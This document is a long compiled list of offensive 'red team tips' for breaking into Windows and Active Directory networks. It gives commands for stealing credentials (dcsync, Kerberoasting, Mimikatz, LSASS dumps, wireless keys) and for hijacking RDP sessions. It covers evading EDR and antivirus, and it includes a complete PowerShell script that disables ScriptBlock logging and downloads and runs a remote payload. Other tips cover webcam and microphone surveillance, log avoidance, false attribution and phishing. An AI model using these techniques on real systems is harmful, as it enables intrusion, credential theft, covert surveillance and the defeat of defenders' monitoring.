line: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from software such as Outlook.
If the enemy SOC is using proxy logs for analysis. Guess what? It wont log cookies or POST body content as can be sensitive.
Taking a snapshot of AD can let you browse, explore and formulate future attacks if access is lost momentarily.
consider using Office Template macros and replacing normal.dot for persistence in VDI environments.
Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others to start intel on your target.
Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of assets - https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell
Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral movement. Dont forget beloved RDP.
Make sure theres trackers in your emails, delivery server and payload execution. Any more? Comment to share!
When PowerUp yields no results, dont forget SysInternalss AutoRuns. Often you can find unexpected surprises :)
When using BloodHound, dont forget DA equivalents such as administrators and server operators etc too. These arent mapped.
When navigating mature environments, a good old network diagram along with AD OUs can help to shed some light into next steps.
Kerberoast them hashes, could be a fast route to domain administrator. PowerView Invoke-Kerberoast -Format Hashcat
Shared local administrator account hashes are great for lateral movement. Find machines based on the same build and attack away
Got extra credentials? Use different sets for separate egress channels so that if one account is disabled all the rest are ok.
You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no 2FA. Check the perimeter.
@dafthack MailSniper, @domchell LyncSniper can be a useful but noisy way to obtain AD credentials into an organisation.
@_staaldraad Ruler tool can be used to obtain code execution on a system running Outlook if you can access exchange externally
When tools like MailSniper dont work in custom environments, you still have good old @Burp_Suite to replicate the attacks
Need a DC? echo %LOGONSERVER%. Need a list? nltest /dclist, nslookup -q=srv _kerberos._tcp (domain suffix can autocomplete)
So apparently not many people use SSH for redirector setup. So try out ssh c2 -R *:80:localhost:80. SSH config GatewayPorts yes
Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.
Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing.
Stash payloads in C:\$Recycle.Bin
Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats
Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast.
Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence.
Need more credentials? Search for passwords on Sharepoint, and intranet.
Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!
Lateral movement printers, open webroots, good old Tomcat, what are your quick wins?
Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :)
Hunting e-mails and network shares for penetration testing reports can often yield good results.
List mounts net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes.
Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise.
OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.
FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan
Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough
Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA
Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA
If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply.
@0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.
@Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1
Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!
So you know where the server application files are. Download the binaries and check out configuration files for conn. strings
Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.
Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)
On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.
Incase EDR are looking for net users /domain try using net use /dom
Is EDR potentially looking for powershell -encodedcommand? Try powershell -ec
Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system
Carbon Black checks for IEX and web req commands. Use powershell powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]
Cant open C drive? Try \\127.0.0.1\c$
SC doesnt take credentials. Cant use runas? Try net use \\targetip\ipc$ password /u:domain\username then sc to psexec
When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/
Hide from blue. Volume shadow copy then execute \\?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC
SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.
Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!
Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping
Discuss business targets and objectives with your clients. This process should set non technical goals such as "ATM spit money"
Checking whether a server or host is good for egress? Likely to go down? systeminfo | findstr /i boot
Type query user to see who else is connected to the machine.
Get a quick patch list using wmic qfe list brief. Cross ref KB to bulletins.
Found a process of interest? Dont forget to obtain a MiniDump! Use Out-MiniDump https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
Finally in CyberArk, click policies and see safes but no account? Go to accounts search and search for empty and safes show up
Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in files. WebDav is subject to DLP
WebDav mini http redirector net use * http://totallylegit.com/share then start z:
Found potential MQ creds? ActiveMQ? Try out https://github.com/fmtn/a , works to query MQ endpoints that dont use self signed crt
Use vssadmin to list and create volume shadow copies
Pivoting into a secure zone that has no DNS or web gateway and need exfil? Netsh port forward pivot UDP 53 to DNS 53 then boom
Have blue hidden the ways including winkey+R? Try shift and right click desktop and open command prompt
Tracked down that putty session? Popped the box? Query user and check the victims logon time and idle times
Hijack his Session using sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>" then use putty session
Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.
Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo
Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object
Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed
Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats
RCE on a web application for less mature client? nslookup -q=srv _ldap._tcpif its domain joined Invoke-Kerberoast
@benichmt1 suggests looking for vmdk files across the network. You can use this to potentially access segregated networks
Obfuscation is never bad, especially when its a button click. @danielhbohannon - https://github.com/danielbohannon
Need to sweep for uptimes? Use wmic /node:"<computer>" OS get LastBootUpTime in a for loop
Looking for systems running KeePass? Run a for loop on wmic /node:"host" process list brief :) then look at RT #82
Found KeePass running in memory? Use @harmj0y KeeThief to extract password and dl the KDBX - https://github.com/HarmJ0y/KeeThief
Struggling to find a working DB client? Live off the land and use your victims in an RDP session.
Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe
Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans.
Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating.
@Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials! https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/
Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network.
regsvr32 SCT files are being detected as Squigglydoo. Looks for script case sensitive and <registration case insensitive.
Cisco NGIPS is shit, when analysing traffic for havex it drops only <havexhavex> but not <havexDATABLOBhavex>
Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees
If WDigest is disabled, reenable it for cleartext credentials before new users login with @harmj0y https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1
Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre
Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username
@domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops.
@lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too
Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/
@0x09AL suggests WordSteal. You can embed an IMAGE with UNC path to steal hashes from Word. Wont work if proxy. https://github.com/0x09AL/WordSteal
If client is using Proxy with WebDav you can phish creds using @ryHanson Phishery https://github.com/ryhanson/phishery
Use wgsidav if you need a quick WebDav server :) https://github.com/mar10/wsgidav
Set up red team infrastructure following @bluscreenofjeff guidelines! https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
Easier DNS redirector!
Red team tips are useful but what makes the good red teamer is experience. Rack up that breadth of experience
SessionGopher does a decent job at retrieving putty and RDP history - https://github.com/fireeye/SessionGopher
If ping 8.8.8.8 works, try ICMP tunnelling. More info at http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1 from @fragsh3ll though only on immature network
Wordlists? https://github.com/berzerk0/Probable-WordlistsI like to use the top probable 297 million list with Deadhobo rules
More of a pentest tip but nslookup google.com if it resolves you may have a DNS tunnelling problem.
Post exploitation Asset Discovery https://github.com/vysec/Invoke-DNSDiscovery looks for assets by name that might be good if youre low priv user.
Use Invoke-ProcessScan to give some running processes context on a system. This uses EQGRP leaked list- https://github.com/vysec/Invoke-ProcessScan
Mature blue? Be careful and minidump lssas.exe then download it and parse locally
Found an exploitable S4U condition? Use Mistique to attack! https://github.com/machosec/Mystique/blob/master/Mystique.ps1
Need to use VNC as RDP in use? https://github.com/artkond/Invoke-Vnchas been pretty stable for me. Run it then pivot in and connect!
Found super secret.doc or master password database.xlsx? Use office2john to get hash and crack in Hashcat!
PowerUp didnt work and you want to autoruns? Dont bother going on disk, use Invoke-AutoRuns to csv- https://github.com/p0w3rsh3ll/AutoRuns
Need to zip up a directory quickly for easy exfiltration? Eg. Home shares https://github.com/thoemmi/7Zip4Powershell use Powershell
Use CatMyFish to search for categorised domains that could be used in your engagements - https://github.com/Mr-Un1k0d3r/CatMyFish
Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y DomainTrustExplorer to generate a graph https://github.com/sixdub/DomainTrustExplorer
FOCA finds some useful information for OSINT and intelligence phases. https://www.elevenpaths.com/labstools/foca/index.html
GoPhish is a pretty useful tool for spinning up simple phishing campaigns especially for decoys https://getgophish.com
If you have write access to the orgs shared Office template folders You can privesc by backdooring these trusted documents.
@zwned uses netsh packet tracing to sniff natively from victim host. Save capture and analyze offline!
More decoy tips! Scan the external perimeter with tools like Nessus and OpenVAS. More traffic the better just to burn the blue
Read Sean Metcalfa blog http://adsecurity.org/ When AD is used in many environments, it vital to at least know techniques
Remember you can generate a golden ticket offline with knowledge of krbtgt and rest offline. Golden ticket gets silver from DC
Got krbtgt of a child domain? Forest parent trusts you? Use the SID history attack in golden tickets to escalate to Ent Admin
You dont necessarily need Domain Admin, if you have an account that has Replicating directory changes rights, dcsync to pull hash using that account.
Planning to use secretsdump.py? :) Try using the DC machine account to authenticate and dump instead of a user! Save hash
Use machine account hashes to generate silver tickets to a host for persistence. Save machine hash for DC incase krbtgt rotate
Use PEAS to query shares and emails if using ActiveSync - https://github.com/mwrlabs/peas
(Not red really but useful) Sort IPs cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4 or even `cat IPs.txt | sort -v"
Learn AWK and general bash scripting. Processing and merging of data sets speeds up our job for discovery and time keeping.
Worth learning to pick locks and the dust can sensor trick if youre going to do some physical. http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/
Grep has an extract flag -o that can be used to extract from a regex. Good for extracting data from massive blobs.
Victims use wireless? Use KARMA attack to force them onto your network. Use eternalblue, domain creds or other vulns to get in. https://github.com/sensepost/mana
Phishing pages are usually custom. However its always good to have a stash for decoys. Generic Gmail, Office365?
Keep up to date by watching presentations from conferences on YouTube :) Discover useful techniques
If youve exhausted all payload types, try sending a Mac user a python one liner and Win PS 1 liner. Ive had people run it.
If you need to get a clean EXE for file drop and exec, try out @midnite_runr Backdoor Factory - https://github.com/secretsquirrel/the-backdoor-factory
If enemy does not use proxy with TLS inspection then you can use https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/ to mask your c2 channel further
On a Linux box and want to egress from it over a proxy? Use ProxyTunnel to pipe SSH - https://github.com/proxytunnel/proxytunnel
Need some OSINT? Keep Spiderfoot running long term to accompany your manual OSINT sources http://www.spiderfoot.net
OSINTing? TheHarvester does a decent job at subdomains. Though theres better ways to get emails bulk. https://github.com/laramies/theHarvester
Exploring and want to use WMI? https://www.microsoft.com/en-us/download/details.aspx?id=8572 is pretty useful for exploring the different namespaces and classes.
Need to reset a password? Do it then quickly dcsync for previous password hash and use NTLMinject - https://github.com/vletoux/NTLMInjector
IDS flagging known payload binary blob? Base64 encode it in your payload and use certutil, PS or VB to decode it!
Test your phishing campaigns before sending!!!
If youre sending into Exchange, make sure your SMTP server is not in SPAM list or black lists. Check junk mails mail headers
Use Microsofts Message Header Analyzer to parse and review email headers from Outlook. https://testconnectivity.microsoft.com/MHA/Pages/mha.aspx
Make sure phishing emails Bounce header matches From. Or else some will flag as malicious.
DomainHunter also looks for good candidate expired domains - https://github.com/minisllc/domainhunter
Want to scrape MetaData in CLI? Use PowerMeta. Linux users can use PowerShell too! https://github.com/dafthack/PowerMeta
RDP in use? Dont want to use VNC? Try mimikatzs ts::multirdp in memory patch by @gentilkiwi
Admin on a machine with VPN client? certificate extraction using Mimikatz by @gentilkiwi. Dont forget to dl configs. Backdoor
Master all the quick wins to Domain privilege escalation. When youre pressured to get DA in 15 mins, you want to know you can
@Akijos notes that we should be careful when using silver tickets with scheduled tasks. Author is the user account youre on.
If you dont need a golden ticket, dont generate it.
Scan a DNS server for Alexa top 1 million spoofable domains :) Ive got a massive list, do you?
Scan the internet for a list of domain frontable domains! Ive got a big big list ready for whenever I want to use them :)
We all know people share credentials between different services. Try these credentials on other accounts owned by the user!
Cant crack a password? Try the users previous passwords from history in AD. They may follow a pattern.
Cant crack a hash owned by a user? Take all previously discovered passwords from their files and generate a new word list.
Cant crack a password? Make sure these are in your word list name of company, town, capital, country, months! Appear a lot.
Didier Stevens has SelectMyParent tool that lets you spawn a child process with an arbitrary parent. https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/
Using SelectMyParent stops those detections eg. powershell.exe spawning cmd.exe. @armitagehackers CobaltStrike has ppid cmd!

Use PowerPoint mouse over text to invoke a powershell command one liner. #adversarysimulation - https://www.dodgethissecurity.com/2017/06/02/new-powerpoint-mouseover-based-downloader-analysis-results/
Follow @mattifestation to keep up to date with blue team advances. Just in case blue is actually up to date with mitigations!
Using VBS or JS? Cant stage using PowerShell.exe as blocked? @Cneelis released https://github.com/Cn33liz/StarFighters so you can keep use PS
Not sure who uses Wi-Fi webcams but go run a mass deauth attack if youre going to plan on breaking in physically to discon
@malcomvetter Never use defaults - run Mimikatz with AES and 8 hour tickets to avoid passive detection from NG defense tools!
Win XP doesnt have PowerShell? Try using Unmanaged powershell to keep using your favourite scripts!
@anthonykasza tells us that the at.exe command takes base64 encoded Params! Eg. at.exe b64::[encoded params]
Grab cleartext wireless keys netsh wlan show profile name="ssid" key=clear
Got a shell on a victim without admin? Want their creds? Try Inveigh then rpcping -s 127.0.0.1 -t ncacn_np to leak hash.
Got a low priv shell and need creds? Use Invoke-LoginPrompt by @enigma0x3 https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1
Get access to shadow admin accounts, they can DCsync and are essentially DA. https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/
If blue detects PTH. Try extract Kerberos tickets and PTT.
@lefterispan wrote https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2 â€¦ which sets up a proxy and forces an auth attempt to it to leak hash. Low priv leak.
When creating phishing pages, try cloning and modifying parts of the client's own webpages. For example of their VPN login!
Regardless of whether there are known defences. Run your PS scripts through Obfuscation before loading into memory.
Stuck trying to find those assets still? Try @424f424f Get-BrowserData https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
Follow @JohnLaTwC as he tweets phishing examples and sometimes with new techniques used in Wild. Good for adversary simulation
@MrUn1k0d3r released https://github.com/Mr-Un1k0d3r/SCT-obfuscator â€¦ can probably bypass Gateway signatures when performing SCT delivery for regsvr32! https://github.com/Mr-Un1k0d3r/SCT-obfuscator
We always talk about Windows and AD. But now let's have a look at Linux and AD with https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9
Use WSUS for lateral movement https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1
View @jpcert https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf â€¦ and look at all those indicators and artefacts left behind. Then hexedit those tools ?
Found a portal using 2FA? Using RSA SecureID? https://blog.netspi.com/targeting-rsa-emergency-access-tokencodes-fun-profit/ â€¦ Pin bruteforce!
@pwnagelabs says to avoid bash history on exit using kill -9 $$
@pwnagelabs teaches us how to avoid wtmp logging with ssh -l user target -T
@bluscreenofjeff shows us how to use Apache Mod rewrite to randomly serve different payloads https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/
Domain user? Query LDAP for Printers. Attempt default creds or known vulns then read Service account creds, hash or relay
Get-WmiObject -Class MicrosoftDNS_AType -NameSpace Root\MicrosoftDNS -ComputerName DC001 | Export-CSV -not dns.csv
Password protected doc in email? For some reason a lot of people send the password separately to the same inbox. #epicfail
Can't see another part of the network and there's a DC? Pivot off the DC :)
C:\windows\system32\inetsrv\appcmd list site to find IIS bindings.
DA -> Locate DB -> Found MSSQL? https://github.com/NetSPI/PowerUpSQL use PowerUpSQL to enumerate and privesc by stealing tokens.
If ACL doesn't let you read other users' home shares, you can try net view \\fileserv /all to try other shares and folders!
Username jondoe and jondoe-x? Ones an Admin? Try same password. May be shared ? repeat for entire user list.
Failed to phish? Payloads failing? Mac users? Write an email and ask them to open terminal and paste in python Empyre one line
@_wald0 blessed us with this BH cypher query to skip specific nodes to look for other paths. https://pastebin.com/qAzH9uji
@424f424f pushed some research into LNK files inside CAB can be used to bypass the Attachment Manager ?http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/
When domain fronting, your calls hit the edge node, so every domain you use potentially hits a different a IP! ?
If using @Cneelis StarFighter. Instead of using a staged web delivery, just stick while stageless payload as encoded block in!
Printers are often good MAC addresses to use to beat NAC when physical red teaming as printers (mostly?) don't support 802.1x
If proxy is blocking SCT file, replace <scriptlet> with <package> and add <component id="test"> around the rest. Thx @subTee
CobaltStrike's @armitagehacker VNC not working? Here's a workaround using @artkond Invoke-VNC https://github.com/vysec/Aggressor-VYSEC/blob/master/vnc-psh.cna
Got C2 on Windows user but no credentials? Leak a hash using @leftp's code. Implemented into CNA https://github.com/vysec/Aggressor-VYSEC/blob/master/Invoke-CredLeak.ps1
@Nebulator spoke on IP regex by IR at #SnoopCon. Here's CobaltStrike @armitagehacker CNA to automate https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna
Automate environment prepping and spawn all processes as a child of explorer.exe by @armitagehacker https://github.com/vysec/Aggressor-VYSEC/blob/master/auto-prepenv.cna
@subTee highlighted to us that XML requests can be used as a download cradle in constrained language mode!
Check out @armitagehacker's post on OPSEC considerations when using Cobalt Strike's beacon. https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/
Reset AD passwords from Linux with @mubix https://room362.com/post/2017/reset-ad-user-password-with-linux/ :) proxychains it over your pivot :D
Got a NetNTLMv1 hash? Convert it to NTLM by cracking three DES keys https://hashcat.net/forum/thread-5912.html
If you don't 100 percent understand NETNTLMv1 and v2 read up on https://blog.smallsec.ca/2016/11/21/ntlm-challenge-response/
If you don't know how LM and NTLM hashing works... go back to basics with https://blog.smallsec.ca/2016/11/07/windows-credentials/
@424f424f just made me aware that FireEye can prevent runas from executing. Use unmanaged PS to spawn https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1
S4U can be used to delegate across SPN. So if you have msds-allowedtodelagateto HTTP you can exploit to obtain HOST and CIFS
You're in a subnet where people RDP into but you can't attack outwards? Set backdoor over tsclient on start keys. ?

Unsure what the localised admin account might be called or need to copy and paste? Check out https://social.technet.microsoft.com/wiki/contents/articles/13813.localized-names-for-administrator-account-in-windows.aspx
EDR monitoring whoami? Use echo %userprofile% echo %username% Or replace echo with anything that reflects error ie. set
Network segregation in play? Try Get-NetSubnet, Get-NetSite in PowerView or browse in AD explorer. Can help find your way :)
If you want to simulate MBR activity like #Petya, check out https://github.com/PowerShellMafia/PowerSploit/blob/master/Mayhem/Mayhem.psm1
Secure your beach heads against #Petya WMIC /node:host process call create â€œecho > C:\windows\perfcâ€
Using Linux? Modify /etc/dhcp/dhclient.conf and remove gethostname() for Opsec when you VPN or have to rock up on site.
Stuck in a heavily segregated situation on a server? Try RDPInception attack vector out https://www.mdsec.co.uk/2017/06/rdpinception/
Reduce AV detection by using fake Microsoft certificate.
Not using notifications yet for C2 events? For @armitagehacker's Cobalt Strike check out https://github.com/Und3rf10w/Aggressor-scripts

Using PowerShell? # ScriptBlock Logging Bypass
# @cobbr_io
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
Can help you Bypass ScriptBlock Logging for added OpSec :)
If you can't use Reg class in WMI to exfil in CLM, use @christruncer's OSRecoveryConfiguration! Examples in WMI Implant.
Sandbox Analysis taking place? @arvanaghi has a centralised repo of anti sandbox techniques https://github.com/Arvanaghi/CheckPlease
When facing Sandboxes, learn about filetypes and limitations. Dropped some examples at @Steel_Con and even more at @HITBGSEC!
@ropnop wrote https://gist.github.com/ropnop/8711392d5e1d9a0ba533705f7f4f455f â€¦ to perform Kerberos TGT password bruteforce. Potentially stealthier than traditional SMB
Admin to machine X? X has SPN set to delegate access? Bam! Hit machine X, you don't need to crack no machine hash.
Low privilege prevent ATP sending logs? Modify registry and serve WPAD locally to not send data to Msft Domains. @retBandit
CACTUSTORCH introduces a new set of TTP in Payload Generation. https://github.com/mdsecactivebreach/CACTUSTORCH â€¦ Reduces signature footprints too!
Looking for a decent domain but need to force categorisation? Check out https://github.com/mdsecactivebreach/Chameleon â€¦! - abuses bugs in proxies ???
Use WSUSPENDU to move laterally with fake updates even across airgapped environments.
Instead of using rundll32, try control @domchell and winword /L @subTee ? change indicators!
Typo squat domains or names containing the target company name might be monitored by registration watch lists.
Doing many concurrent adversary simulation gigs? Automate the boring target collection process with https://www.mdsec.co.uk/2017/07/reconnaissance-using-linkedint/
When deploying infrastructure, aim to have distinct sets that should not allow for correlation to each other.
Blue looking for net users /domain? Try out n^eT^1 us^er^s /do
In malware delivery, add user identifiable trackers in the execution container to ensure that further steps not failing.
Use SLK files instead of XLS for Excel DDE code exec without protected view issues. Discovered by @enigma0x3
Limiting allowed inbound IP ranges using iptables will restrict the ability for external IR teams to fetch payloads or stage
Keying implants will reduce the likelihood of execution if any keyed item is incorrect. In long operations useful for stealth.
ATP? sc stop diagtrack
Over PTH? Use all AES RC4 NTLM.
Finding zero day DLL hijacks with Rattler can be useful for stealthier long term persistence.
Don't use remote exploitation where possible as IDS will often flag on such attempts.
Local exploitation may be flagged by endpoint security although less likely.
Exploits such as MS17-010 can be routed internally for privilege escalation using portforwards. Lowers risk of IDS detections.
ATA detects where tools such as UserHunter or BloodHound query AD. Instead, blacklist DCs. Use file shares / high pop servers.
Use WMI or WinAPI calls to perform host recon when up against ATP.
PowerShell Injection Vulnerability Hunter can be integrated into VSCode. Start writing secure offensive PowerShell? ?
Be extremely cautious when generating tickets and remember to use AES hashes as default good practice where possible.
Wiki, sharepoint, intranet, fileshares often have access control misconfigs. Almost as good as privilege escalation for info.
@_staaldraad Phishing with OAuth http://staaldraad.github.io/pentest/phishing/2017/08/02/o356-phishing-with-oauth/
Obfuscate your macro documents with @MrUn1k0d3râ€˜s https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
Need fast and accurate execution of BloodHound attack paths? try out https://github.com/vysec/ANGRYPUPPY â€¦ by @vysecurity and @001SPARTaN
https://github.com/ramen0x3f/AggressorScripts/blob/master/credpocalypse.cna â€¦ can be set on high volume servers to make sure you get all the credentials ;D @ramen0x3f
PyBrute for Recon (now reconned) by @OrOneEqualsOne https://github.com/OrOneEqualsOne/reconned â€¦ Good for enumeration of subdomains :)
@MrUn1k0d3r releases UniByAv. XOR encrypts shellcode and then does Hyperion type brute force to break the key. ? FUD FUD FUD.
Use @armitagehacker's CobaltStrike? I'd be careful with NOD32 as it seems to be detecting ElevateKit's use of Powerpick & UacBypass
Load arbitrary DLL from xwizard.exe by @Hexacorn http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
Use rundll32.exe a lot? Try copy it to another directory to appear as diff name. http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/
Use Cloud Hosts / CDNs for redirectors. Unless the cloud provider sells you out, they have no way to find out where the c2 is.
scans.io has some pretty good databases for a list of subdomains potentially for your target. Use the SQL AXFR one!
If you're using a domain with the bank's name in it, be careful when registering SSL certs, may get flagged on watch list.

Payloads served via email links and attachments being sandboxes? Try sending payloads via. direct Skype messages! ? Red tip - sign up for @VirusTotal intelligence (easy if your company has others using it) - create YARA rules for your domains/tools/handle
Enumerate DevOps stack, WSUS, Endpoint security agents - use these to jump into segregated zones.
Once again. Never forget SharePoint, easy search functionality and often yields good results.
@_rastamouse shows you how to manually extract relevant RDP credentials from Cred Vault in his labs! https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
Use lsadump::dcsync /all /csv in Mimikatz to perform DRSUAPI grabbing of all hashes! Nice.
SMB leaking fails if proper network segregation. Thank humans for laptops, work from home, cafes and free wifi! @haifeili
Domain Fronting Domain lists for popular CDNs can be found at https://github.com/vysec/DomainFrontingLists â€¦ good for defenders too!
When performing physical social engineering, don't forget to pretend to actually scan your ID when tailgating
Using HTAs? Follow @enigma0x3 to keep up-to-date with his discovery of monikers to spawn under different parent processes.
Review every column in the DB. Sometimes your objective is mislabeled or hiding in a big table. @malcomvetter
Remove all document information when creating your Macros. You can even edit the file to put in false attribution data.
Block common security vendors from grabbing your link payloads https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10.

Aquatone is a DNS discovery tool https://github.com/michenriksen/aquatoneâ€¦. Finds some interesting subdomains that I've not seen in some other sources. :D for ex one time it found me a VPN hostname format that I could then simply brute all combinations to discover more.
41GB Password dump is a good place to get an idea of username and email formats for target. Also if there are multiple formats in use.

Password cracking is hard. I love Top297Million-Probable, rockyou was decent for a quick smash, but lately found out about Keyboard Walks. Add keyboard walks with rules into your cracking routines to get more hashes cracked! https://github.com/hashcat/kwprocessor â€¦ Share your ideas!

Use Exchange timing attacks to narrow down a predicted list of emails down to an accurate list. Better than checking for bounces. @dafthack https://github.com/dafthack/MailSniper â€¦ implements this attack.

Embed UNC paths into e-mails to leak a hash from the occasional work from home or travelling employee. Several mitigation's for this such as setting no automatic authentication in inetcpl.cpl and use of the host based firewall. Try using a generic email template.

Got administrative rights across the domain but can't hit certain network segments? Be sure to check out web apps, many places and web apps support â€œscript executionâ€ for administrators. Get a shell and try to hit the target segment from the web app.

Using net users isn't the only way to get users from AD. You don't always need to do it from the endpoint. If EDR is an issue connect to web apps and use intranet, mail, dev stack and other tools to obtain user lists and groups.
If you can't beat EDR, go around it! @_RastaMouse

GPO Misconfigurations are more common than you might think! Not talking about good old cpassword but also file permissions and editable scripts. Check out https://github.com/l0ss/Grouper by @mikeloss that automates this!

@PyroTek3 has documented lots of AD security related information. Probably not a pure red tip but knowing whether and how the blue team or target might fix an issue definitely helps when trying to discover if they're vulnerable as well as the reporting phase.

Although I thought it was clear as Microsoft documented it but LAPS passwords are in clear text to users that have the right privileges in AD. Friendly reminder :) Either just browse LDAP or https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/ â€¦ or https://blog.netspi.com/running-laps-around-cleartext-passwords/ â€¦ @harmj0y @kfosaaen

Linked to #280, @harmj0y has useful references, information and explanations for discovering GPO permissions. https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/ I just used Get-ACL on SYSVOL. Works for me.

Windows Credential Vault is often used to store saved passwords. @_rastamouse walks us through the decryption procedures required to make use of these credentials in his blog post at https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/

Automatically switch to the most profitable coin to mine using @rvrsh3lls crypto currency mining assistance PowerShell scripts! https://github.com/rvrsh3ll/CrypoCurrencyPowerShell/blob/master/Mine-BestCoin.ps1

Look for pentest and Security reports. Inboxes, file shares, intranets. Replicate vulnerabilities that other people find and report but haven't been fixed. I've done this so many times because client decrypts a report and archives it in clear text.
Defender anti ransomware in use? http://www.securitybydefault.com/2018/01/microsoft-anti-ransomware-bypass-not.html?m=1 shows us how we can use a COM object to bypass the anti-write.
@3gstudent has enlightened us with a way to fully list all installed applications. Some applications could not be enumerated using WMI.
Don't use WMI to query Win32_Product. Makes an event log entry for tons of MSIinstaller source. Holy crap, this is going on my black list.

